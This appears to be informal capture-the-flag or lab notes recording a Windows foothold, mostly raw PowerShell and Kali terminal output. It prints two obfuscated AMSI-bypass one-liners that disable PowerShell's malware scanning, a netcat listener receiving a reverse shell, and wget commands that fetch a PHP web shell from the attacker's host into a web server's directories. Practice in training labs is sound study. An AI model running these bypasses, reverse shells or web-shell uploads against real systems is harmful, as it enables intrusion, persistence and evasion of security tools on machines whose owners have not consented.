Can't wget! need to stop amsi? tried and was thrown out. tried another, yay, not thrown out and no error!

```powershell
CF C:\xampp\htdocs> wget http://10.18.21.236/cmd.php -o cmd.php
CF C:\xampp\htdocs> ls


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        12/9/2023  12:05 AM                uploads                                                               
-a----        8/17/2023   5:09 AM           5024 6xK3dSBYKcSV-LCoeQqfX1RYOo3qNa7lqDY.woff2                             
-a----        7/16/2023   4:29 PM         213642 background-image.jpg                                                  
-a----        7/11/2023   5:11 PM           9711 background-image2.jpg                                                 
-a----        8/17/2023   5:11 AM           3554 font.css                                                              
-a----        8/29/2023   9:55 AM           3591 index.php                                                             


CF C:\xampp\htdocs> [Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.100.147] 49952
(c) Microsoft Corporation. All rights reserved.

C:\Users\evader\Documents>[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true)
C:\Users\evader\Documents> $error
C:\Users\evader\Documents> 
```

Stupid me, I forgot the port when wget:ing. Might have worked!!

```powershell
C:\xampp\htdocs\uploads> wget http://10.18.21.236:8000/cmd.php -o cmd.php
C:\xampp\htdocs\uploads> ls


    Directory: C:\xampp\htdocs\uploads


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        12/9/2023   2:03 AM             40 cmd.php                                                               
-a----        12/9/2023   1:56 AM             15 log.txt                                                               
-a----        12/9/2023   1:56 AM            752 vulnerable.ps1                                                        


C:\xampp\htdocs\uploads> 

```